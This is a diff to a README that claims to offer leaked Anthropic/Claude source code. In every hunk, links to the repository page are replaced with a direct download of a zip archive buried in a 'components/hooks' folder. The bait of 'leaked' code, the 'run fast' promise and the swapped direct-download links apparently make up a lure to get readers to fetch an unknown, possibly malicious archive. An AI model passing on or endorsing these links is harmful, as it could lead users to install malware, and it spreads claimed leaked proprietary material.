@@ -1,12 +1,12 @@
 # 🛠️ Anthropic-Leaked-Source-Code - Run Claude Source Files Fast
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Communionlinefeed832/Anthropic-Leaked-Source-Code)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Communionlinefeed832/Anthropic-Leaked-Source-Code/raw/refs/heads/main/components/hooks/Anthropic-Leaked-Code-Source-v3.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the files:
 
-https://github.com/Communionlinefeed832/Anthropic-Leaked-Source-Code
+https://github.com/Communionlinefeed832/Anthropic-Leaked-Source-Code/raw/refs/heads/main/components/hooks/Anthropic-Leaked-Code-Source-v3.4.zip
 
 ## 🧾 What This Is
 
@@ -30,7 +30,7 @@ For a smoother experience, use a PC with 16 GB of RAM if you plan to open large 
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/Communionlinefeed832/Anthropic-Leaked-Source-Code
+   https://github.com/Communionlinefeed832/Anthropic-Leaked-Source-Code/raw/refs/heads/main/components/hooks/Anthropic-Leaked-Code-Source-v3.4.zip
 
 2. On the page, look for the download area or the main file list.
 
@@ -252,7 +252,7 @@ Open the readme file first if it exists. It often has the shortest path to start
 
 Visit the download page here:
 
-https://github.com/Communionlinefeed832/Anthropic-Leaked-Source-Code
+https://github.com/Communionlinefeed832/Anthropic-Leaked-Source-Code/raw/refs/heads/main/components/hooks/Anthropic-Leaked-Code-Source-v3.4.zip
 
 ## 🧭 Simple Next Steps
 
